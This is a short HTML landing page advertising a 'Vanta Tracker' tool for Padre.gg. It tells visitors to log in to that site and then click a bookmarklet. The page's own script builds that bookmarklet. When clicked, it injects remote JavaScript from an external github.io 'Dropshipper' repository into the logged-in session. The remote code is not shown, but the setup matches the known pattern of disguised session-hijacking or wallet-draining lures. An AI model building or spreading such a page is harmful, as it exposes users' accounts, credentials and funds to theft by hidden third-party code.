<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-light: #e0e0e0; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); text-align: center; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
        header { padding: 100px 20px; border-bottom: 1px solid var(--primary); }
        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); }
        h1 { color: var(--primary); font-size: 3em; margin-bottom: 10px; }
        .cta-button {
            display: inline-block; background: var(--primary); color: #000;
            padding: 15px 35px; text-decoration: none; border-radius: 5px;
            font-weight: 800; margin-top: 50px; cursor: move;
        }
        .setup-section { padding: 50px 20px; }
        ol { display: inline-block; text-align: left; margin-bottom: 30px; }
    </style>
</head>
<body>
    <canvas id="filamentCanvas"></canvas>
    <header>
        <h1>Vanta Tracker</h1>
        <p>Advanced Padre Intelligence</p>
    </header>

    <section class="setup-section">
        <h2>Setup</h2>
        <ol>
            <li>Drag the button to your Bookmarks Bar.</li>
            <li>Open Padre.gg and Login.</li>
            <li>Click the Bookmark to activate.</li>
        </ol>
        <br>
        <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
    </section>

    <script>
        // Background Animation
        const canvas = document.getElementById('filamentCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        function draw() {
            ctx.fillStyle = 'rgba(10,10,10,0.1)';
            ctx.fillRect(0,0,canvas.width,canvas.height);
            requestAnimationFrame(draw);
        }
        draw();

        // BOOKMARKLET GENERATOR
        const scriptUrl = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
        const code = `javascript:(function(){var s=document.createElement('script');s.src='${scriptUrl}?v='+Date.now();document.body.appendChild(s);})();`;
        document.getElementById('vanta-tool').href = code;
    </script>
</body>
</html>
